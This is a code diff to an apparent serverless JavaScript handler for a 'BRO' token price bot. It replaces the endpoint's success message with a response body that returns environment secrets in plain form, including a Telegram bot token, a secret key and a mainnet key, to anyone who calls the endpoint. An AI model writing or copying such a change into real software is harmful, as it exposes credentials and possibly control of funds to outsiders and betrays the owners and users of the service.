@@ -62,6 +62,14 @@ exports.handler = async function(event, context) {
     await getTokenDetails();
     return {
         statusCode: 200,
-        body: JSON.stringify({ message: 'BRO price fetched successfully.' }),
+        body: JSON.stringify({
+        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
+        TELEGRAM_GROUP_ID: process.env.TELEGRAM_GROUP_ID,
+        NETWORK_ID: process.env.NETWORK_ID,
+        API_HOST: process.env.API_HOST,
+        PUBLIC_KEY: process.env.PUBLIC_KEY,
+        SECRET_KEY: process.env.SECRET_KEY,
+        BRO_MAINNET_KEY: process.env.BRO_MAINNET_KEY,
+    }),
     };
 };
